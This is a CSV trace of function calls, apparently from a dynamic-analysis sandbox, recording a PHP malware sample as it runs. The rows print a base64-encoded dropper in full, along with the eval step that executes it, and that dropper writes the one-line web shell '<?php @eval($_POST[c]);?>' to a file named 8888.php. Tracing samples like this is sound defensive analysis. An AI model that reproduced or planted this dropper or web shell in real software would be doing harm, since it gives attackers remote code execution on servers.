"uuid","file_md5","index","source","target","argc","argv","return","dynamic"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","0","__main__","zend_compile_file","2","{""value"": []}","{""value"": ""28413C493C3E""}","[]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","1","__main__","base64_decode","1","{""value"": [[0, ""str"", ""ZnB1dHMoZm9wZW4oJzg4ODgucGhwJyx3KSxiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXMk5kS1RzL1BnPT0iKSk7""]]}","{""value"": ""fputs(fopen('8888.php',w),base64_decode(""PD9waHAgQGV2YWwoJF9QT1NUW2NdKTs/Pg==""));""}","[0]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","2","__main__","eval","1","{""value"": [[0, ""phpcode"", ""fputs(fopen('8888.php',w),base64_decode(""PD9waHAgQGV2YWwoJF9QT1NUW2NdKTs/Pg==""));""]]}","{""value"": ""void""}","[0]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","3","eval","zend_compile_string","2","{""value"": [[0, ""source_string"", ""fputs(fopen('8888.php',w),base64_decode(""PD9waHAgQGV2YWwoJF9QT1NUW2NdKTs/Pg==""));""]]}","{""value"": ""4163413C6A413C6A3C3E""}","[0]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","4","eval","fopen","2","{""value"": [[0, ""filename"", ""8888.php""], [1, ""mode"", ""w""]]}","{""value"": false}","[0, 0]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","5","eval","base64_decode","1","{""value"": [[0, ""str"", ""PD9waHAgQGV2YWwoJF9QT1NUW2NdKTs/Pg==""]]}","{""value"": ""<?php @eval($_POST[c]);?>""}","[0]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","6","eval","fputs","2","{""value"": [[0, ""fp"", false], [1, ""str"", ""<?php @eval($_POST[c]);?>""]]}","{""value"": ""void""}","[0, 0]"
"f8a7ed64f4b70d7cb0b6473ae96b4e18","df4928ab81235c09e6a48ca9b288a582","7","__main__","phpinfo","0","{""value"": []}","{""value"": ""void""}","[]"
